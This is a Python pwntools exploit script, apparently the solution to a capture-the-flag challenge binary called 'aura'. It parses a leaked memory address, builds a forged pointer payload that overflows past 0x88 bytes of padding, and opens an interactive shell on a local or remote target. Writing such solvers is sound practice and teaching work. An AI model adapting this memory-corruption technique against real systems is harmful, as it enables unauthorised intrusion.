from pwn import *
import argparse

def connect(host=None, port=None):
    return remote(host, port) if host and port else process('./aura')

def leak_aura(p):
    p.recvuntil(b'my aura: ')
    return int(p.recvline().strip(), 16)

def forge_payload(aura_addr):
    payload  = p64(0) * 7
    payload += p64(aura_addr) + p64(aura_addr + 0x10)
    payload = payload.ljust(0x88, b' ')
    payload += p64(aura_addr)
    return payload

def exploit(p):
    aura = leak_aura(p)
    p.recvuntil(b'ur aura? ')
    p.send(forge_payload(aura))
    p.sendline(b'A'*8)
    p.interactive()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str)
    parser.add_argument('--port', type=int)
    args = parser.parse_args()
    p = connect(args.host, args.port)
    exploit(p)

if __name__ == '__main__':
    main()